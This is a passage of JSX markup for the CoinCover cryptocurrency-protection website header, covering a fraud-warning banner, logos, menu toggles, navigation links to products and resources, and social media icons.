  <div className="body-wrapper   hs-content-id-70251980258 hs-site-page page   show_marketing_strip header-theme-dark">
    <div data-global-resource-path="Coincover_April2025_CTA9/templates/partials/header.html">
      <div className="header-group">
        <header className="header">
          <div className="header_top_notification ">
            <div
              id="hs_cos_wrapper_module_header_notification_banner"
              className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module"
              style={{}}
              data-hs-cos-general-type="widget"
              data-hs-cos-type="module"
            >
              <div className="header_notification_section">
                <div className="header_notification_content text-size-regular">
                  <span className="notification_item">
                    <a
                      href="https://www.coincover.com/blog/beware-of-fraudsters-impersonating-coincover"
                      target="_blank"
                      rel="noopener"
                    >
                      Beware of fraudsters impersonating CoinCover. We will
                      never cold-call you and ask for your personal information.
                      Read more here.&nbsp;
                    </a>
                    <svg
                      width={20}
                      height={21}
                      viewBox="0 0 20 21"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M9.9987 3.83203L8.8237 5.00703L13.4737 9.66536H3.33203V11.332H13.4737L8.8237 15.9904L9.9987 17.1654L16.6654 10.4987L9.9987 3.83203Z"
                        fill="white"
                      />
                    </svg>
                  </span>
                  <span className="notification_item">
                    <a
                      href="https://www.coincover.com/blog/beware-of-fraudsters-impersonating-coincover"
                      target="_blank"
                      rel="noopener"
                    >
                      Beware of fraudsters impersonating CoinCover. We will
                      never cold-call you and ask for your personal information.
                      Read more here.&nbsp;
                    </a>
                    <svg
                      width={20}
                      height={21}
                      viewBox="0 0 20 21"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M9.9987 3.83203L8.8237 5.00703L13.4737 9.66536H3.33203V11.332H13.4737L8.8237 15.9904L9.9987 17.1654L16.6654 10.4987L9.9987 3.83203Z"
                        fill="white"
                      />
                    </svg>
                  </span>
                  <span className="notification_item">
                    <a
                      href="https://www.coincover.com/blog/beware-of-fraudsters-impersonating-coincover"
                      target="_blank"
                      rel="noopener"
                    >
                      Beware of fraudsters impersonating CoinCover. We will
                      never cold-call you and ask for your personal information.
                      Read more here.&nbsp;
                    </a>
                    <svg
                      width={20}
                      height={21}
                      viewBox="0 0 20 21"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M9.9987 3.83203L8.8237 5.00703L13.4737 9.66536H3.33203V11.332H13.4737L8.8237 15.9904L9.9987 17.1654L16.6654 10.4987L9.9987 3.83203Z"
                        fill="white"
                      />
                    </svg>
                  </span>
                </div>
              </div>
            </div>
          </div>
          <a href="#main-content" className="header__skip">
            Skip to content
          </a>
          <div className="header_top_section" style={{ display: "none" }}>
            <div className="header__container">
              <div className="header_top_container_row">
                <span
                  id="hs_cos_wrapper_right_column"
                  className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_rich_text"
                  style={{}}
                  data-hs-cos-general-type="widget"
                  data-hs-cos-type="rich_text"
                >
                  <p>
                    <a
                      href="https://www.coincover.com/knowledge-hub/reports/the-trust-factor"
                      style={{ textDecoration: "none" }}
                      rel="noopener"
                    >
                      The Trust Factor. Will regulation take crypto to the next
                      level? Read the full report
                    </a>
                  </p>
                </span>
              </div>
            </div>
          </div>
          <div className="header_bottom_section">
            <div className="header__container content-wrapper main-header-container">
              <div className="header_bottom_container_row">
                <div
                  id="hs_cos_wrapper_module_header_logo"
                  className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module"
                  style={{}}
                  data-hs-cos-general-type="widget"
                  data-hs-cos-type="module"
                >
                  <div className="header-logo black">
                    <div className="logo_image">
                      <a href="https://www.coincover.com/">
                        <img
                          src="https://www.coincover.com/hubfs/Coincover_April2025_CTA9/images/header_logo.svg"
                          alt="CoinCover"
                          loading="lazy"
                          width={22}
                          height={28}
                        />
                      </a>
                    </div>
                    <div className="logo_text">
                      <a href="https://www.coincover.com/">
                        <img
                          src="https://www.coincover.com/hubfs/Coincover_April2025_CTA9/images/header_hover_logo.svg"
                          alt="header_hover_logo"
                          loading="lazy"
                          width={157}
                          height={26}
                        />
                      </a>
                    </div>
                  </div>
                  <div className="header-logo white">
                    <div className="logo_image">
                      <a href="https://www.coincover.com/">
                        <img
                          src="https://www.coincover.com/hubfs/Coincover_April2025_CTA9/images/header_logo_white.svg"
                          alt="CoinCover"
                          loading="lazy"
                          width={22}
                          height={28}
                        />
                      </a>
                    </div>
                    <div className="logo_text">
                      <a href="https://www.coincover.com/">
                        <img
                          src="https://www.coincover.com/hubfs/Coincover_April2025_CTA9/images/header_logo_text_white.svg"
                          alt="Coincover"
                          loading="lazy"
                          width={169}
                          height={27}
                        />
                      </a>
                    </div>
                  </div>
                </div>
                <div className="hs-header-menu-group row">
                  <div className="header-menu-wrapper">
                    <div className="header-button-group">
                      <div
                        id="hs_cos_wrapper_module_custom_button"
                        className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module"
                        style={{}}
                        data-hs-cos-general-type="widget"
                        data-hs-cos-type="module"
                      >
                        <div className="hs_custom_btn ">
                          <a
                            className="custom_btn_text"
                            href="https://www.coincover.com/contact"
                          >
                            <span>Get in touch</span>
                          </a>
                        </div>
                      </div>
                      <div className="header_desktop_menu_trigger desktop_view">
                        <button className="trigger_btn" type="button">
                          <span>Menu</span>
                        </button>
                      </div>
                      <div className="header_desktop_login_btn"></div>
                      <div className="header_desktop_menu_trigger mobile_view">
                        <button
                          type="button"
                          className={`trigger_btn normal_trigger ${isMenuOpen ? 'hidden' : ''}`}
                          onClick={() => setIsMenuOpen(true)}
                        >
                          <svg
                            width={27}
                            height={27}
                            viewBox="0 0 27 27"
                            fill="none"
                            xmlns="http://www.w3.org/2000/svg"
                          >
                            <g clipPath="url(#clip0_1382_6419)">
                              <path
                                d="M24.2069 13.44C24.2069 12.6336 24.8214 12 25.6034 12C26.3669 12 27 12.6336 27 13.44C27 14.2272 26.3669 14.88 25.6034 14.88C24.8214 14.88 24.2069 14.2272 24.2069 13.44ZM18.1552 13.44C18.1552 12.6336 18.7697 12 19.5517 12C20.3152 12 20.9483 12.6336 20.9483 13.44C20.9483 14.2272 20.3152 14.88 19.5517 14.88C18.7697 14.88 18.1552 14.2272 18.1552 13.44ZM12.1034 13.44C12.1034 12.6336 12.7179 12 13.5 12C14.2634 12 14.8966 12.6336 14.8966 13.44C14.8966 14.2272 14.2634 14.88 13.5 14.88C12.7179 14.88 12.1034 14.2272 12.1034 13.44ZM6.05172 13.44C6.05172 12.6336 6.66621 12 7.44828 12C8.21172 12 8.84483 12.6336 8.84483 13.44C8.84483 14.2272 8.21172 14.88 7.44828 14.88C6.66621 14.88 6.05172 14.2272 6.05172 13.44ZM0 13.44C0 12.6336 0.614483 12 1.39655 12C2.16 12 2.7931 12.6336 2.7931 13.44C2.7931 14.2272 2.16 14.88 1.39655 14.88C0.614483 14.88 0 14.2272 0 13.44Z"
                                fill="#0E171B"
                              />
                              <path
                                d="M24.2069 1.4208C24.2069 0.6336 24.8214 0 25.6034 0C26.3669 0 27 0.6336 27 1.4208C27 2.2272 26.3669 2.88 25.6034 2.88C24.8214 2.88 24.2069 2.2272 24.2069 1.4208ZM18.1552 1.4208C18.1552 0.6336 18.7697 0 19.5517 0C20.3152 0 20.9483 0.6336 20.9483 1.4208C20.9483 2.2272 20.3152 2.88 19.5517 2.88C18.7697 2.88 18.1552 2.2272 18.1552 1.4208ZM12.1034 1.4208C12.1034 0.6336 12.7179 0 13.5 0C14.2634 0 14.8966 0.6336 14.8966 1.4208C14.8966 2.2272 14.2634 2.88 13.5 2.88C12.7179 2.88 12.1034 2.2272 12.1034 1.4208ZM6.05172 1.4208C6.05172 0.6336 6.66621 0 7.44828 0C8.21172 0 8.84483 0.6336 8.84483 1.4208C8.84483 2.2272 8.21172 2.88 7.44828 2.88C6.66621 2.88 6.05172 2.2272 6.05172 1.4208ZM0 1.4208C0 0.6336 0.614483 0 1.39655 0C2.16 0 2.7931 0.6336 2.7931 1.4208C2.7931 2.2272 2.16 2.88 1.39655 2.88C0.614483 2.88 0 2.2272 0 1.4208Z"
                                fill="#0E171B"
                              />
                              <path
                                d="M24.2069 25.44C24.2069 24.6528 24.8214 24 25.6034 24C26.3669 24 27 24.6528 27 25.44C27 26.2272 26.3669 26.88 25.6034 26.88C24.8214 26.88 24.2069 26.2272 24.2069 25.44ZM18.1552 25.44C18.1552 24.6528 18.7697 24 19.5517 24C20.3152 24 20.9483 24.6528 20.9483 25.44C20.9483 26.2272 20.3152 26.88 19.5517 26.88C18.7697 26.88 18.1552 26.2272 18.1552 25.44ZM12.1034 25.44C12.1034 24.6528 12.7179 24 13.5 24C14.2634 24 14.8966 24.6528 14.8966 25.44C14.8966 26.2272 14.2634 26.88 13.5 26.88C12.7179 26.88 12.1034 26.2272 12.1034 25.44ZM6.05172 25.44C6.05172 24.6528 6.66621 24 7.44828 24C8.21172 24 8.84483 24.6528 8.84483 25.44C8.84483 26.2272 8.21172 26.88 7.44828 26.88C6.66621 26.88 6.05172 26.2272 6.05172 25.44ZM0 25.44C0 24.6528 0.614483 24 1.39655 24C2.16 24 2.7931 24.6528 2.7931 25.44C2.7931 26.2272 2.16 26.88 1.39655 26.88C0.614483 26.88 0 26.2272 0 25.44Z"
                                fill="#0E171B"
                              />
                            </g>
                            <defs>
                              <clipPath id="clip0_1382_6419">
                                <rect width={27} height={27} fill="white" />
                              </clipPath>
                            </defs>
                          </svg>
                        </button>
                        <button
                          type="button"
                          className={`trigger_btn opened_trigger ${!isMenuOpen ? 'hidden' : ''}`}
                          onClick={() => setIsMenuOpen(false)}
                        >
                          <svg
                            width={27}
                            height={27}
                            viewBox="0 0 27 27"
                            fill="none"
                            xmlns="http://www.w3.org/2000/svg"
                          >
                            <g clipPath="url(#clip0_1382_10015)">
                              <path
                                d="M0.432236 18.4831C1.00193 17.9134 1.92522 17.8938 2.51456 18.4831C3.08425 19.0528 3.08425 19.9957 2.51456 20.5654C1.92522 21.1548 1.00193 21.1351 0.432236 20.5654C-0.1571 19.9761 -0.1571 19.0724 0.432236 18.4831ZM4.95048 13.9649C5.52017 13.3952 6.44346 13.3755 7.0328 13.9649C7.60249 14.5346 7.60249 15.4775 7.0328 16.0472C6.46311 16.6169 5.52017 16.6169 4.95048 16.0472C4.36114 15.4578 4.38079 14.5346 4.95048 13.9649ZM9.46872 9.46627C10.0384 8.89658 10.9617 8.87693 11.551 9.46627C12.1207 10.036 12.1207 10.9789 11.551 11.5486C10.9813 12.1183 10.0384 12.1183 9.46872 11.5486C8.87938 10.9593 8.89903 10.036 9.46872 9.46627ZM13.987 4.94803C14.5567 4.37833 15.4799 4.35869 16.0693 4.94803C16.639 5.51772 16.639 6.46065 16.0693 7.03035C15.4996 7.60004 14.5567 7.60004 13.987 7.03035C13.3976 6.44101 13.4173 5.51772 13.987 4.94803ZM18.5052 0.429784C19.0749 -0.139908 19.9982 -0.159552 20.5875 0.429784C21.1572 0.999475 21.1572 1.94241 20.5875 2.5121C20.0178 3.08179 19.0749 3.08179 18.5052 2.5121C17.9159 1.92277 17.9355 0.999475 18.5052 0.429784Z"
                                fill="#0E171B"
                              />
                              <path
                                d="M18.5051 18.4831C19.0748 17.9134 19.9981 17.8938 20.5874 18.4831C21.1571 19.0528 21.1571 19.9957 20.5874 20.5654C20.0177 21.1351 19.0748 21.1351 18.5051 20.5654C17.9158 19.9761 17.9354 19.0528 18.5051 18.4831ZM13.9869 13.9649C14.5566 13.3952 15.4799 13.3755 16.0692 13.9649C16.6389 14.5346 16.6389 15.4775 16.0692 16.0472C15.4995 16.6169 14.5566 16.6169 13.9869 16.0472C13.3975 15.4578 13.4172 14.5346 13.9869 13.9649ZM9.46863 9.46627C10.0383 8.89658 10.9616 8.87693 11.551 9.46627C12.1206 10.036 12.1206 10.9789 11.551 11.5486C10.9813 12.1183 10.0383 12.1183 9.46863 11.5486C8.8793 10.9593 8.89894 10.036 9.46863 9.46627ZM4.95039 4.94803C5.52008 4.37833 6.46302 4.37833 7.03271 4.94803C7.6024 5.51772 7.6024 6.46065 7.03271 7.03035C6.46302 7.60004 5.52008 7.60004 4.95039 7.03035C4.3807 6.46065 4.3807 5.51772 4.95039 4.94803ZM0.432151 0.429784C1.00184 -0.139908 1.94478 -0.159552 2.51447 0.429784C3.08416 0.999475 3.08416 1.94241 2.51447 2.5121C1.94478 3.0818 1.00184 3.0818 0.432151 2.5121C-0.13754 1.92277 -0.13754 0.999475 0.432151 0.429784Z"
                                fill="#0E171B"
                              />
                            </g>
                            <defs>
                              <clipPath id="clip0_1382_10015">
                                <rect width={21} height={21} fill="white" />
                              </clipPath>
                            </defs>
                          </svg>
                        </button>
                      </div>
                    </div>
                  </div>
                  <div className={`hs_header_menu_group desktop_view ${isMenuOpen ? '' : 'hidden'}`}>
                    <div
                      id="hs_cos_wrapper_module_header_mega_menu"
                      className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module"
                      style={{}}
                      data-hs-cos-general-type="widget"
                      data-hs-cos-type="module"
                    >
                      <div className="hs_header_mega_menu">
                        <div className="inner_wrapper">
                          <div className="top_menu_section">
                            <ul>
                              <li className="with_child_menu active">
                                <a className="menu_main_item">
                                  <span>For institutions</span>
                                </a>
                                <div className="header_child_menu">
                                  <span
                                    id="hs_cos_wrapper_module_header_mega_menu_"
                                    className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu"
                                    style={{}}
                                    data-hs-cos-general-type="widget"
                                    data-hs-cos-type="simple_menu"
                                  >
                                    <div
                                      id="hs_menu_wrapper_module_header_mega_menu_"
                                      className="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal"
                                      role="navigation"
                                      data-sitemap-name=""
                                      data-menu-id=""
                                      aria-label="Navigation Menu"
                                    >
                                      <ul role="menu">
                                        <li
                                          className="hs-menu-item hs-menu-depth-1 hs-item-has-children"
                                          role="none"
                                        >
                                          <a
                                            href="javascript:void(0);"
                                            aria-haspopup="true"
                                            aria-expanded="false"
                                            role="menuitem"
                                            target="_self"
                                          >
                                            Products
                                          </a>
                                          <ul
                                            role="menu"
                                            className="hs-menu-children-wrapper"
                                          >
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/products/recover-for-institutions"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                CoinCover Recover for
                                                Institutions
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/products/protect"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                CoinCover Protect
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/products/recover"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                CoinCover Recover
                                              </a>
                                            </li>
                                          </ul>
                                        </li>
                                        <li
                                          className="hs-menu-item hs-menu-depth-1 hs-item-has-children"
                                          role="none"
                                        >
                                          <a
                                            href="javascript:void(0);"
                                            aria-haspopup="true"
                                            aria-expanded="false"
                                            role="menuitem"
                                            target="_self"
                                          >
                                            Solutions
                                          </a>
                                          <ul
                                            role="menu"
                                            className="hs-menu-children-wrapper"
                                          >
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/solutions/exchanges"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Exchanges
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/solutions/financial-institutions"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Financial institutions
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/solutions/wallets"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Wallets
                                              </a>
                                            </li>
                                          </ul>
                                        </li>
                                        <li
                                          className="hs-menu-item hs-menu-depth-1 hs-item-has-children"
                                          role="none"
                                        >
                                          <a
                                            href="javascript:void(0);"
                                            aria-haspopup="true"
                                            aria-expanded="false"
                                            role="menuitem"
                                            target="_self"
                                          >
                                            Risks we protect against
                                          </a>
                                          <ul
                                            role="menu"
                                            className="hs-menu-children-wrapper"
                                          >
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/risks/lost-wallet-access"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Lost wallet access
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/risks/crypto-fraud"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Crypto fraud
                                              </a>
                                            </li>
                                          </ul>
                                        </li>
                                      </ul>
                                    </div>
                                  </span>
                                </div>
                              </li>
                              <li className="with_child_menu ">
                                <a className="menu_main_item">
                                  <span>For people</span>
                                </a>
                                <div className="header_child_menu">
                                  <span
                                    id="hs_cos_wrapper_module_header_mega_menu_"
                                    className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu"
                                    style={{}}
                                    data-hs-cos-general-type="widget"
                                    data-hs-cos-type="simple_menu"
                                  >
                                    <div
                                      id="hs_menu_wrapper_module_header_mega_menu_"
                                      className="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal"
                                      role="navigation"
                                      data-sitemap-name=""
                                      data-menu-id=""
                                      aria-label="Navigation Menu"
                                    >
                                      <ul role="menu">
                                        <li
                                          className="hs-menu-item hs-menu-depth-1 hs-item-has-children"
                                          role="none"
                                        >
                                          <a
                                            href="javascript:void(0);"
                                            aria-haspopup="true"
                                            aria-expanded="false"
                                            role="menuitem"
                                            target="_self"
                                          >
                                            Products
                                          </a>
                                          <ul
                                            role="menu"
                                            className="hs-menu-children-wrapper"
                                          >
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/consumers/products/recover"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                What is CoinCover Recover?
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/consumers/products/protect"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                What is CoinCover Protect?
                                              </a>
                                            </li>
                                          </ul>
                                        </li>
                                        <li
                                          className="hs-menu-item hs-menu-depth-1 hs-item-has-children"
                                          role="none"
                                        >
                                          <a
                                            href="javascript:void(0);"
                                            aria-haspopup="true"
                                            aria-expanded="false"
                                            role="menuitem"
                                            target="_self"
                                          >
                                            Risks we protect against
                                          </a>
                                          <ul
                                            role="menu"
                                            className="hs-menu-children-wrapper"
                                          >
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/consumers/risks/lost-access"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Lost wallet access
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/consumers/risks/crypto-fraud"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Crypto fraud
                                              </a>
                                            </li>
                                          </ul>
                                        </li>
                                      </ul>
                                    </div>
                                  </span>
                                </div>
                              </li>
                              <li className="with_child_menu ">
                                <a className="menu_main_item">
                                  <span>Knowledge Hub</span>
                                </a>
                                <div className="header_child_menu">
                                  <span
                                    id="hs_cos_wrapper_module_header_mega_menu_"
                                    className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu"
                                    style={{}}
                                    data-hs-cos-general-type="widget"
                                    data-hs-cos-type="simple_menu"
                                  >
                                    <div
                                      id="hs_menu_wrapper_module_header_mega_menu_"
                                      className="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal"
                                      role="navigation"
                                      data-sitemap-name=""
                                      data-menu-id=""
                                      aria-label="Navigation Menu"
                                    >
                                      <ul role="menu">
                                        <li
                                          className="hs-menu-item hs-menu-depth-1 hs-item-has-children"
                                          role="none"
                                        >
                                          <a
                                            href="javascript:void(0);"
                                            aria-haspopup="true"
                                            aria-expanded="false"
                                            role="menuitem"
                                            target="_self"
                                          >
                                            Resources
                                          </a>
                                          <ul
                                            role="menu"
                                            className="hs-menu-children-wrapper"
                                          >
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://developer.coincover.com/"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Developer portal
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://app.eu.vanta.com/coincover/trust/z6bu6okf6urtu438efcwz"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Trust Center
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/knowledge-hub/assets-we-protect"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Assets we protect
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/knowledge-hub/faqs"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Crypto FAQs
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/knowledge-hub/glossary"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Glossary
                                              </a>
                                            </li>
                                          </ul>
                                        </li>
                                        <li
                                          className="hs-menu-item hs-menu-depth-1 hs-item-has-children"
                                          role="none"
                                        >
                                          <a
                                            href="javascript:void(0);"
                                            aria-haspopup="true"
                                            aria-expanded="false"
                                            role="menuitem"
                                            target="_self"
                                          >
                                            Partners
                                          </a>
                                          <ul
                                            role="menu"
                                            className="hs-menu-children-wrapper"
                                          >
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/partners/partner-directory"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Partner directory
                                              </a>
                                            </li>
                                          </ul>
                                        </li>
                                        <li
                                          className="hs-menu-item hs-menu-depth-1 hs-item-has-children"
                                          role="none"
                                        >
                                          <a
                                            href="javascript:void(0);"
                                            aria-haspopup="true"
                                            aria-expanded="false"
                                            role="menuitem"
                                            target="_self"
                                          >
                                            Insight
                                          </a>
                                          <ul
                                            role="menu"
                                            className="hs-menu-children-wrapper"
                                          >
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/blog"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                Blog
                                              </a>
                                            </li>
                                            <li
                                              className="hs-menu-item hs-menu-depth-2"
                                              role="none"
                                            >
                                              <a
                                                href="https://www.coincover.com/knowledge-hub/reports/the-trust-factor"
                                                role="menuitem"
                                                target="_self"
                                              >
                                                The Trust Factor
                                              </a>
                                            </li>
                                          </ul>
                                        </li>
                                      </ul>
                                    </div>
                                  </span>
                                </div>
                              </li>
                              <li>
                                <a href="https://www.coincover.com/about">
                                  <span>About us</span>
                                </a>
                              </li>
                              <li>
                                <a href="https://www.coincover.com/contact">
                                  <span>Contact us</span>
                                </a>
                              </li>
                            </ul>
                          </div>
                          <div className="bottom_social_icons_section">
                            <ul>
                              <li>
                                <a
                                  href="https://www.linkedin.com/company/coincoverglobal/"
                                  target="_blank"
                                  rel="noopener"
                                >
                                  <span className="social_icon custom_svg_icon">
                                    <svg
                                      width={28}
                                      height={28}
                                      viewBox="0 0 28 28"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <path
                                        fillRule="evenodd"
                                        clipRule="evenodd"
                                        d="M10.1784 20.9998V11.5544H7.17692V20.9998H10.1786H10.1784ZM21 20.9998V15.5832C21 12.6819 19.5194 11.3323 17.5448 11.3323C15.9526 11.3323 15.2394 12.2484 14.8401 12.8917V11.5544H11.8392C11.879 12.4408 11.8392 20.9998 11.8392 20.9998H14.8401V15.7248C14.8401 15.4425 14.8596 15.1602 14.939 14.9585C15.1556 14.3947 15.6498 13.8104 16.4788 13.8104C17.5643 13.8104 17.9991 14.677 17.9991 15.9462V21H21V20.9998ZM8.69795 7C7.67091 7 7 7.70624 7 8.63209C7 9.55793 7.65062 10.2642 8.65812 10.2642H8.67747C9.72403 10.2642 10.3756 9.53849 10.3756 8.63209C10.3563 7.70763 9.72593 7.00198 8.69795 7Z"
                                        fill="white"
                                      />
                                    </svg>
                                  </span>
                                </a>
                              </li>
                              <li>
                                <a
                                  href="https://x.com/Coincoverglobal"
                                  target="_blank"
                                  rel="noopener"
                                >
                                  <span className="social_icon custom_svg_icon">
                                    <svg
                                      width={28}
                                      height={28}
                                      viewBox="0 0 28 28"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <path
                                        d="M15.3318 12.9045L20.5436 6.84625H19.3086L14.7832 12.1066L11.1688 6.84625H7L12.4657 14.8008L7 21.1538H8.23514L13.0141 15.5987L16.8312 21.1538H21L15.3318 12.9045ZM13.6401 14.8708L13.0863 14.0787L8.6801 7.77596H10.5771L14.1331 12.8625L14.6869 13.6545L19.3092 20.2662H17.4122L13.6401 14.8708Z"
                                        fill="#0E171B"
                                      />
                                    </svg>
                                  </span>
                                </a>
                              </li>
                              <li>
                                <a
                                  href="https://www.youtube.com/@CoinCover3"
                                  target="_blank"
                                  rel="noopener"
                                >
                                  <span className="social_icon custom_svg_icon">
                                    <svg
                                      width={28}
                                      height={28}
                                      viewBox="0 0 28 28"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <path
                                        d="M11.9682 16.9531V11.049L17.1584 14.0013L11.9682 16.9531ZM23.513 9.19031C23.2786 8.32876 22.6165 7.66266 21.775 7.42694L21.757 7.42297C19.6427 7.15414 17.1976 7.00053 14.716 7.00053C14.4636 7.00053 14.2122 7.00185 13.9612 7.00503L13.9996 7.0045C13.7864 7.00185 13.5353 7 13.2831 7C10.8015 7 8.3548 7.15361 5.9534 7.45104L6.24076 7.42191C5.38212 7.66213 4.71999 8.3277 4.4901 9.17177L4.48613 9.18899C4.22128 10.5855 4.07031 12.1924 4.07031 13.8345C4.07031 13.8927 4.07031 13.951 4.07111 14.0085V13.9992C4.07111 14.0482 4.07031 14.1065 4.07031 14.1647C4.07031 15.8068 4.22181 17.4131 4.51129 18.9712L4.48613 18.8097C4.72052 19.6712 5.38265 20.3371 6.22408 20.5731L6.24182 20.577C8.35586 20.8459 10.8012 20.9995 13.2829 20.9995C13.5345 20.9995 13.7861 20.9981 14.0377 20.995L13.9993 20.9955C14.2125 20.9981 14.4641 21 14.7157 21C17.1982 21 19.6441 20.8464 22.0455 20.5492L21.7581 20.5784C22.6175 20.3387 23.2797 19.6726 23.5101 18.8285L23.5141 18.8113C23.7784 17.415 23.9293 15.8079 23.9293 14.1666C23.9293 14.1083 23.9293 14.0501 23.9288 13.9923V14.0011C23.9288 13.9521 23.9293 13.8938 23.9293 13.8355C23.9293 12.1935 23.7776 10.5871 23.4884 9.02928L23.5135 9.19084H23.5127L23.513 9.19031Z"
                                        fill="#0E171B"
                                      />
                                    </svg>
                                  </span>
                                </a>
                              </li>
                              <li>
                                <a
                                  href="https://bsky.app/profile/coincoverglobal.bsky.social"
                                  target="_blank"
                                  rel="noopener"
                                >
                                  <span className="social_icon custom_svg_icon">
                                    <svg
                                      width={28}
                                      height={28}
                                      viewBox="0 0 28 28"
                                      fill="none"
                                      xmlns="http://www.w3.org/2000/svg"
                                    >
                                      <g clipPath="url(#clip0_4310_82948)">
                                        <path
                                          d="M17.2132 15.5456L17.8801 15.7086C19.2067 16.067 20.6968 16.9931 20.0581 18.596C19.718 19.4497 18.5537 20.5217 17.6994 20.849C15.8773 21.5471 14.8335 19.6665 14.2935 18.2592C14.207 18.0339 14.1353 17.7295 14.0352 17.5242C14.0255 17.5044 14.0179 17.4885 13.999 17.4755C13.98 17.4885 13.9724 17.5044 13.9628 17.5242C13.8627 17.7295 13.7909 18.0339 13.7045 18.2592C12.9742 20.1622 11.6718 21.9717 9.50919 20.4039C8.80681 19.8946 7.86586 18.9433 7.7924 18.0339C7.68415 16.6935 9.03516 16.0134 10.1289 15.7056L10.7847 15.5456L10.1539 15.6028C8.38816 15.6605 6.74235 14.8428 6.43066 12.9819C6.3342 12.4061 6.28359 11.7799 6.22971 11.1963C6.16895 10.537 6.11202 9.8706 6.07376 9.20968C6.0174 8.23487 6.02336 6.93213 7.35848 7.00275C9.05121 7.09226 10.9621 9.20308 11.9541 10.4529C12.7273 11.427 13.425 12.4681 13.999 13.5728C14.521 12.562 15.1524 11.609 15.8452 10.7083C16.8626 9.38564 18.7487 7.23941 20.4858 7.01936C22.2208 6.7996 21.962 8.6974 21.8816 9.81985C21.8315 10.519 21.771 11.223 21.6971 11.9199C21.6081 12.7598 21.5682 13.5048 21.076 14.2219C20.2338 15.4491 18.6073 15.741 17.2132 15.5457L17.2132 15.5456Z"
                                          fill="#0E171B"
                                        />
                                      </g>
                                      <defs>
                                        <clipPath id="clip0_4310_82948">
                                          <rect
                                            width="15.887"
                                            height={14}
                                            fill="white"
                                            transform="translate(6.05664 7)"
                                          />
                                        </clipPath>
                                      </defs>
                                    </svg>
                                  </span>
                                </a>
                              </li>
                              <li>
